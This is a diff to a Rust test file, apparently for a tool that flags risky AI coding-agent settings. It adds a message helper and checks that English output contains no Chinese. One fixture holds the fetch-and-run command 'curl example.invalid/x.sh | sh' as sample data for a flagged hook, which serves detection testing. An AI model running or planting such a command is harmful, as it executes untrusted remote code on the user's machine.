@@ -432,6 +432,15 @@ fn a_quota_report_below_the_limit_clears_that_window() {
 // ---------------------------------------------------------------- 英文
 
 /// 有没有中文：汉字、中文标点、全角符号
+/// core 发来的一句话。码随便取一个界面不认识的：这里测的是退回英文原句那条路
+fn msg(code: &str, text: &str) -> tw_api::Msg {
+    tw_api::Msg {
+        code: code.into(),
+        args: Default::default(),
+        text: text.into(),
+    }
+}
+
 fn has_chinese(s: &str) -> bool {
     s.chars().any(|c| {
         let c = c as u32;
@@ -463,8 +472,8 @@ fn in_english_no_rule_writes_a_chinese_word() {
         client: "claude-code".into(),
         path: "~/.claude/settings.json".into(),
         line: 3,
-        title: tw_api::Msg::plain("A hook runs a downloaded script"),
-        detail: tw_api::Msg::plain("The hook pipes a download into a shell"),
+        title: msg("t.title", "A hook runs a downloaded script"),
+        detail: msg("t.detail", "The hook pipes a download into a shell"),
         excerpt: "curl example.invalid/x.sh | sh".into(),
     };
     let flagged = |blocked: bool| tw_api::Event::ToolCallFlagged {
@@ -511,7 +520,8 @@ fn in_english_no_rule_writes_a_chinese_word() {
                 step: "handshake".into(),
                 peer: "proxy".into(),
             }),
-            detail: Some(tw_api::Msg::plain(
+            detail: Some(msg(
+                "t.detail",
                 "The proxy rejected the user name and password.",
             )),
             at_ms: T0,
